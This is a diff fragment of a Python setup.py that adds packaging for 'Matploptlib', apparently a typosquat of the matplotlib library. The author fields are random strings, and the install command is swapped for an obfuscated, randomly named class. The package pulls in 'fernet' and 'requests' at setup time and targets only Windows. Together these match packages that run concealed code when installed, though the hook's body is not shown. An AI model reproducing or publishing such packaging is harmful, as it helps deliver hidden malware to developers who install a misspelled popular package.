@@ -18,5 +18,22 @@ class AkUVeZIKMrfLXcIxMZWgpiuOzmyttfHHcYdsGdamShebHzQluFSyEsKRPFGGRQoMCZIRsEZAcL
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+setup(
+    name="Matploptlib",
+    version=VERSION,
+    author="lSFbweQvsaoYETDreGs",
+    author_email="rbynE@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': AkUVeZIKMrfLXcIxMZWgpiuOzmyttfHHcYdsGdamShebHzQluFSyEsKRPFGGRQoMCZIRsEZAcLFXImmrdYMtZFecYnDdIAUGifNZEsqCMJLHplqSKfxcBQVZEWdgMGhIZeqAxgTpLhOLCpQLFaFSQ,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
